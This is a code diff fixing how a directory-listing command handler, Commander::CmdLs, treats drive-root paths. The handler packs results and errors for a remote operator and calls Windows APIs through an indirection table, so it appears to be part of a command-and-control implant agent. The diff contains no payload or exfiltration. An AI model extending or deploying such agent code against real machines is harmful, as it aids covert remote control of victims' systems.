@@ -213,11 +213,20 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	outPacker->Pack32(commandId);
 
 	CHAR  fullpath[MAX_PATH];
-	DWORD fullpathSize = ApiWin->GetFullPathNameA(path, MAX_PATH, fullpath, NULL);
-	if (fullpathSize+2 > MAX_PATH || fullpathSize == 0) {
-		outPacker->Pack8(FALSE);
-		outPacker->Pack32(TEB->LastErrorValue);
-		return;
+	DWORD fullpathSize = MAX_PATH;
+
+	if (pathSize == 3 && path[1] == ':') {
+		fullpath[0] = path[0];
+		fullpath[1] = path[1];
+		fullpathSize = 2;
+	}
+	else {
+		fullpathSize = ApiWin->GetFullPathNameA(path, MAX_PATH, fullpath, NULL);
+		if (fullpathSize + 2 > MAX_PATH || fullpathSize == 0) {
+			outPacker->Pack8(FALSE);
+			outPacker->Pack32(TEB->LastErrorValue);
+			return;
+		}
 	}
 
 	fullpath[fullpathSize]   = '\\';
